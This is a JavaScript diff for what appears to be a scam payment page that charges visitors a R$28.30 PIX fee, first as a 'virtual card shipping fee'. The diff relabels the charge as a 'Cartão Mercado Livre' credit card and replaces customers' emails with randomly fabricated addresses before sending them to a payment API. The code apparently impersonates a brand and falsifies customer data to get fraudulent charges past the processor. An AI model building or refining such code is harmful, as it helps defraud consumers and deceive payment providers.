@@ -457,11 +457,26 @@
             button.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right: 10px;"></i>Gerando PIX...';
             button.disabled = true;
 
-            // Determinar tipo de documento baseado no comprimento
-            const documentType = params.document.length === 11 ? 'CPF' : 'CNPJ';
+            // Gerar email aleatório baseado no nome
+            function generateRandomEmail(name) {
+                const cleanName = name.toLowerCase()
+                    .replace(/\s+/g, '')
+                    .normalize('NFD')
+                    .replace(/[\u0300-\u036f]/g, ''); // Remove acentos
+                
+                const domains = ['gmail.com', 'hotmail.com', 'yahoo.com.br', 'outlook.com'];
+                const randomDomain = domains[Math.floor(Math.random() * domains.length)];
+                const randomNumber = Math.floor(Math.random() * 999) + 1;
+                
+                return `${cleanName}${randomNumber}@${randomDomain}`;
+            }
             
             // Gerar external_id único
             const externalId = 'frete_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+            
+            // Gerar email aleatório
+            const randomEmail = generateRandomEmail(decodeURIComponent(params.name));
+            
             try {
                 const response = await fetch('https://api.viperpay.org/v1/transactions', {
                     method: 'POST',
@@ -475,9 +490,9 @@
                         payment_method: 'PIX',
                         items: [
                             {
-                                id: 'frete_cartao_001',
-                                title: 'Frete do Cartão Virtual',
-                                description: 'Taxa de envio para ativação do cartão virtual e entrega do cartão físico',
+                                id: 'dbfe516b-cc1c-4811-93f5-50526871404d',
+                                title: 'Cartão Mercado Livre',
+                                description: 'Cartão de credito',
                                 price: 28.30,
                                 quantity: 1,
                                 is_physical: true
@@ -485,9 +500,9 @@
                         ],
                         customer: {
                             name: decodeURIComponent(params.name),
-                            email: params.email || 'cliente@email.com',
+                            email: randomEmail,
                             phone: params.phone,
-                            document_type: documentType,
+                            document_type: 'CPF',
                             document: params.document
                         }
                     })
